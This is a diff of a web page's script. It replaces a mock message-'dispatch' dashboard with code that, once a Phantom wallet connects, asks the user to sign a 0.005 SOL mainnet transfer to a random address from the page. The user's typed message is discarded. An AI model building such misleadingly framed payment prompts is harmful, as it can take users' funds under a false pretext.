-    const addresses = Array.from(document.querySelectorAll("td code"));
-    const copyBurst = document.getElementById("copyBurst");
-    const replyBurst = document.getElementById("replyBurst");
-    const phantomBanner = document.getElementById("phantomBanner");
-    const phantomChip = document.getElementById("phantomChip");
-    let burstTimer = null;
-    let replyTimer = null;
+    const solanaWeb3 = window.solanaWeb3;
+    const rows = document.querySelectorAll("tbody tr");
+    const banner = document.getElementById("phantomBanner");
 
-    function randomBetween(min, max) {
-      return Math.random() * (max - min) + min;
-    }
-
-    function formatRate(value) {
-      return value.toFixed(2) + "/s";
-    }
-
-    function formatEta(seconds) {
-      const mins = Math.floor(seconds / 60);
-      const secs = Math.floor(seconds % 60);
-      return mins + "m " + String(secs).padStart(2, "0") + "s";
-    }
-
-    function updateRow(row) {
-      const tier = row.getAttribute("data-tier") || "custom";
-      const sendCell = row.querySelector("[data-send-rate]");
-      const receiveCell = row.querySelector("[data-receive-rate]");
-      const etaCell = row.querySelector("[data-eta]");
-
-      let sendRange = [0.2, 1.4];
-      let receiveRange = [0.2, 1.1];
-      let etaRange = [240, 1100];
-
-      if (tier === "alpha") {
-        sendRange = [1.2, 4.8];
-        receiveRange = [1.0, 4.1];
-        etaRange = [90, 520];
-      } else if (tier === "mid") {
-        sendRange = [0.8, 3.2];
-        receiveRange = [0.6, 2.7];
-        etaRange = [120, 740];
-      } else if (tier === "edge") {
-        sendRange = [1.5, 5.9];
-        receiveRange = [1.4, 5.2];
-        etaRange = [45, 360];
+    // 1. Phantom Detection & Skin
+    function initSkin() {
+      const isPhantom = window.phantom?.solana || window.solana?.isPhantom;
+      if (isPhantom || new URLSearchParams(window.location.search).get('skin') === 'phantom') {
+        document.body.classList.add("phantom-skin");
+        banner.textContent = "Phantom Active: Decisive Signal Enabled";
       }
-
-      sendCell.textContent = formatRate(randomBetween(sendRange[0], sendRange[1]));
-      receiveCell.textContent = formatRate(randomBetween(receiveRange[0], receiveRange[1]));
-      etaCell.textContent = formatEta(randomBetween(etaRange[0], etaRange[1]));
     }
+    initSkin();
 
-    function updateAllRows() {
-      rows.forEach(updateRow);
-    }
-
-    updateAllRows();
-    setInterval(updateAllRows, 2200);
-
-    enablePhantomSkinIfNeeded();
-
-    addresses.forEach(function (code) {
-      code.classList.add("copyable-address");
-      code.title = "Copy address";
-      code.addEventListener("click", function () {
-        copyAddress(code.textContent);
-      });
-    });
-
-    rows.forEach(function (row) {
-      const button = row.querySelector("[data-send]");
+    // 2. Transaction Logic
+    rows.forEach(row => {
+      const btn = row.querySelector("[data-send]");
+      const status = row.querySelector(".send-status");
       const input = row.querySelector(".message-input");
-      const status = row.querySelector("[data-send-status]");
-      const address = row.querySelector("code").textContent;
-      const messageBox = row.querySelector(".message-box");
+      const msgBox = row.querySelector(".message-box");
 
-      button.addEventListener("click", function () {
-        const message = input.value.trim();
+      btn.addEventListener("click", async () => {
+        const provider = window.phantom?.solana || window.solana;
 
-        if (!message) {
-          status.textContent = "Dispatch line required.";
-          return;
+        // Visual Feedback
+        msgBox.classList.add("dispatch-run");
+        setTimeout(() => msgBox.classList.remove("dispatch-run"), 500);
+
+        if (provider?.isPhantom) {
+          try {
+            status.textContent = "Connecting...";
+            await provider.connect();
+
+            // Select Random Wallet from the table
+            const allCodes = document.querySelectorAll("code");
+            const randomAddr = allCodes[Math.floor(Math.random() * allCodes.length)].textContent;
+
+            status.textContent = "Signing Tx...";
+            
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+            const transaction = new solanaWeb3.Transaction().add(
+              solanaWeb3.SystemProgram.transfer({
+                fromPubkey: provider.publicKey,
+                toPubkey: new solanaWeb3.PublicKey(randomAddr),
+                lamports: 0.005 * solanaWeb3.LAMPORTS_PER_SOL, // ~$1 in SOL
+              })
+            );
+
+            const { blockhash } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = provider.publicKey;
+
+            const { signature } = await provider.signAndSendTransaction(transaction);
+            status.textContent = "Dispatched: " + signature.slice(0, 6);
+            
+            document.getElementById("replyBurst").style.display = "block";
+            setTimeout(() => document.getElementById("replyBurst").style.display = "none", 2000);
+            
+          } catch (err) {
+            status.textContent = "Dispatch Failed.";
+            console.error(err);
+          }
+        } else {
+          status.textContent = "Simulator: " + (input.value || "Signal Sent");
         }
-
-        messageBox.classList.remove("dispatch-run");
-        void messageBox.offsetWidth;
-        messageBox.classList.add("dispatch-run");
-        status.textContent = "Dispatch sealed for " + address.slice(0, 8) + "...";
-        input.value = "";
-        showReplyBurst();
       });
     });
 
-    function showCopyBurst() {
-      copyBurst.classList.remove("show");
-      if (burstTimer) {
-        clearTimeout(burstTimer);
-      }
-      void copyBurst.offsetWidth;
-      copyBurst.classList.add("show");
-      burstTimer = setTimeout(function () {
-        copyBurst.classList.remove("show");
-      }, 900);
-    }
-
-    function showReplyBurst() {
-      replyBurst.classList.remove("show");
-      if (replyTimer) {
-        clearTimeout(replyTimer);
-      }
-      void replyBurst.offsetWidth;
-      replyBurst.classList.add("show");
-      replyTimer = setTimeout(function () {
-        replyBurst.classList.remove("show");
-      }, 1900);
-    }
-
-    async function copyAddress(value) {
-      try {
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          await navigator.clipboard.writeText(value);
-        } else {
-          fallbackCopy(value);
-        }
-        showCopyBurst();
-      } catch (error) {
-        fallbackCopy(value);
-        showCopyBurst();
-      }
-    }
-
-    function fallbackCopy(value) {
-      const input = document.createElement("textarea");
-      input.value = value;
-      input.setAttribute("readonly", "");
-      input.style.position = "absolute";
-      input.style.left = "-9999px";
-      document.body.appendChild(input);
-      input.select();
-      document.execCommand("copy");
-      document.body.removeChild(input);
-    }
-
-    phantomBanner.addEventListener("click", function () {
-      const targetUrl = new URL(window.location.href);
-      targetUrl.searchParams.set("skin", "phantom");
-      const refUrl = window.location.origin;
-      const phantomUrl =
-        "https://phantom.app/ul/browse/" +
-        encodeURIComponent(targetUrl.toString()) +
-        "?ref=" +
-        encodeURIComponent(refUrl);
-      window.location.href = phantomUrl;
+    // 3. Copy Logic
+    document.querySelectorAll("code").forEach(code => {
+      code.addEventListener("click", () => {
+        navigator.clipboard.writeText(code.textContent);
+        const burst = document.getElementById("copyBurst");
+        burst.style.display = "block";
+        setTimeout(() => burst.style.display = "none", 800);
+      });
     });
 
-    function enablePhantomSkinIfNeeded() {
-      const params = new URLSearchParams(window.location.search);
-      const wantsPhantomSkin = params.get("skin") === "phantom";
-      const ua = navigator.userAgent || "";
-      const looksLikePhantom =
-        ua.toLowerCase().includes("phantom") ||
-        (window.phantom && window.phantom.solana);
-
-      if (!wantsPhantomSkin && !looksLikePhantom) {
-        return;
+    // 4. Banner Redirect
+    banner.addEventListener("click", () => {
+      if (!window.solana) {
+        const url = encodeURIComponent(window.location.href + "?skin=phantom");
+        window.location.href = `https://phantom.app/ul/browse/${url}`;
       }
-
-      document.body.classList.add("phantom-skin");
-      phantomChip.textContent = "Phantom Mode";
-      copyBurst.textContent = "Phantom Copy!";
-      replyBurst.textContent = "Waiting For Reply";
-    }
+    });
   </script>
 </body>
 </html>
